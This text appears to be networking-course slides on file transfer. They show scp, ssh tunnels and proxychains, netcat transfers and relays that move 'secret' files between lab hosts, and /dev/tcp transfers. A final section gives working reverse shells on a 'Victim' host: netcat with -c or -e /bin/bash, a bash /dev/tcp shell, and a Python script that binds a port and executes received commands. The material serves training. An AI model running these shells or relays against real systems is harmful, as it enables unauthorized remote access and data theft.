    https://net.cybbh.io/-/public/-/jobs/878264/artifacts/modules/networking/slides-v4/09_file_transfer.html
______________________________________________________________________________________________________________________
# |
# |
# |
# |
# SCP Syntax
## Download a file from a remote directory to a local directory
    $ scp student@172.16.82.106:secretstuff.txt /home/student
## Upload a file to a remote directory from a local directory
    $ scp secretstuff.txt student@172.16.82.106:/home/student
## Copy a file from a remote host to a separate remote host
    $ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
## Recursive upload of a folder to remote
    $ scp -r folder/ student@172.16.82.106:
## Recursive download of a folder from remote
    $ scp -r student@172.16.82.106:folder/ .
______________________________________________________________________________________________________________________
# SCP Syntax w/ alternate SSHD
## Download a file from a remote directory to a local directory
    $ scp -P 1111 student@172.16.82.106:secretstuff.txt .
## Upload a file to a remote directory from a local directory
    $ scp -P 1111 secretstuff.txt student@172.16.82.106:
______________________________________________________________________________________________________________________
# SCP Syntax through a tunnel
## Create a local port forward to target device
    $ ssh student@172.16.82.106 -L 1111:localhost:22 -NT
## Download a file from a remote directory to a local directory
    $ scp -P 1111 student@localhost:secretstuff.txt /home/student
## Upload a file to a remote directory from a local directory
    $ scp -P 1111 secretstuff.txt student@localhost:/home/student
______________________________________________________________________________________________________________________
# SCP Syntax through a Dynamic Port forward
## Create a Dynamic Port Forward to target device
    $ ssh student@172.16.82.106 -D 9050 -NT
## Download a file from a remote directory to a local directory
    $ proxychains scp student@localhost:secretstuff.txt .
## Upload a file to a remote directory from a local directory
    $ proxychains scp secretstuff.txt student@localhost:
______________________________________________________________________________________________________________________
# |
# |
# |
# |
# NETCAT: Client to Listener file transfer
## Listener (receive file):
    nc -lvp 9001 > newfile.txt
## Client (sends file):
    nc 172.16.82.106 9001 < file.txt
# NETCAT: Listener to Client file transfer
## Listener (sends file):
    nc -lvp 9001 < file.txt
## Client (receive file):
    nc 172.16.82.106 9001 > newfile.txt
______________________________________________________________________________________________________________________
# NETCAT Relay Demos > Listener - Listener
## On Blue_Host-1 Relay:
    $ mknod mypipe p
    $ nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe
## On Internet_Host (send):
    $ nc 172.16.82.106 1111 < secret.txt
## On Blue_Priv_Host-1 (receive):
    $ nc 192.168.1.1 3333 > newsecret.txt
______________________________________________________________________________________________________________________
# NETCAT Relay Demos > Client - Client
## On Internet_Host (send):
    $ nc -lvp 1111 < secret.txt
## On Blue_Priv_Host-1 (receive):
    $ nc -lvp 3333 > newsecret.txt
## On Blue_Host-1 Relay:
    $ mknod mypipe p
    $ nc 10.10.0.40 1111 < mypipe | nc 192.168.1.10 3333 > mypipe
______________________________________________________________________________________________________________________
# NETCAT Relay Demos > Client - Listener
## On Internet_Host (send):
    $ nc -lvp 1111 < secret.txt
## On Blue_Priv_Host-1 (receive):
    $ nc 192.168.1.1 3333 > newsecret.txt
## On Blue_Host-1 Relay:
    $ mknod mypipe p
    $ nc 10.10.0.40 1111 < mypipe | nc -lvp 3333 > mypipe
______________________________________________________________________________________________________________________
# NETCAT Relay Demos > Listener - Client
## On Internet_Host (send):
    $ nc 172.16.82.106 1111 < secret.txt
## On Blue_Priv_Host-1 (receive):
    $ nc -lvp 3333 > newsecret.txt
## On Blue_Host-1 Relay:
    $ mknod mypipe p
    $ nc -lvp 1111 < mypipe | nc 192.168.1.10 3333 > mypipe
______________________________________________________________________________________________________________________
# |
# |
# |
# |
# File Transfer with /dev/tcp
## On the receiving box:
    $ nc -lvp 1111 > devtcpfile.txt
## On the sending box:
    $ cat secret.txt > /dev/tcp/10.10.0.40/1111
______________________________________________________________________________________________________________________
# |
# |
# |
# |
# Reverse shell using NETCAT
## First listen for the shell on your device.
    $ nc -lvp 9999
## On Victim using -c :
    $ nc -c /bin/bash 10.10.0.40 9999
## On Victim using -e :
    $ nc -e /bin/bash 10.10.0.40 9999
# Reverse shell using /DEV/TCP
## First listen for the shell on your device.
    $ nc -lvp 9999
## On Victim:
    $ /bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1
# Reverse shell Python3
    #!/usr/bin/python3
    import socket
    import subprocess
    PORT = 1234        # Choose an unused port
    print ("Waiting for Remote connections on port:", PORT, "\n")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('', PORT))
    server.listen()
    while True:
        conn, addr = server.accept()
        with conn:
            print('Connected by', addr)
            while True:
                data = conn.recv(1024).decode()
                if not data:
                    break
                proc = subprocess.Popen(data.strip(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output, err = proc.communicate()
                response = output.decode() + err.decode()
                conn.sendall(response.encode())
    server.close()
______________________________________________________________________________________________________________________
